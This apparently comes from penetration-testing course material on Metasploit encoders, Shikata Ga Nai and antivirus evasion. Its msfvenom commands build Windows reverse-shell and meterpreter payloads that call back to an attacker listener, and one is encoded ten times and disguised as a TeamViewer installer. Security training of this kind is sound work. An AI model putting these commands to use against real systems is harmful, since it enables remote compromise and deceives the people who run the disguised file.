Over the 15 years of existence of the Metasploit Framework, `Encoders` have assisted with making payloads compatible with different processor architectures while at the same time helping with antivirus evasion. `Encoders` come into play with the role of changing the payload to run on different operating systems and architectures. These architectures include:

| `x64` | `x86` | `sparc` | `ppc` | `mips` |
| ----- | ----- | ------- | ----- | ------ |

They are also needed to remove hexadecimal opcodes known as `bad characters` from the payload. Not only that but encoding the payload in different formats could help with the AV detection as mentioned above. However, the use of encoders strictly for AV evasion has diminished over time, as IPS/IDS manufacturers have improved how their protection software deals with signatures in malware and viruses.
Shikata Ga Nai (`SGN`) was one of the most utilized encoding schemes back in the day because it was very hard to detect payloads encoded through its mechanism. However nowadays, modern detection methods have caught up, and these encoded payloads are far from being universally undetectable anymore.


## Selecting an Encoder
#### Generating Payload - Without Encoding
```shell
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
```

#### Generating Payload - With Encoding
```shell
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```

Suppose we want to select an Encoder for an `existing payload`. Then, we can use the `show encoders` command within the `msfconsole` to see which encoders are available for our current `Exploit module + Payload` combination.

For example, let us try the `MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference Exploit`.

```shell
msf6 exploit(ms09_050_smb2_negotiate_func_index) > show encoders

```

Running multiple iterations of the same encoding to gain a bit in term of evasion:
```shell
msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=8080 -e x86/shikata_ga_nai -f exe -i 10 -o /root/Desktop/TeamViewerInstall.exe
```

Far from perfect from what we can see on VirusTotal.
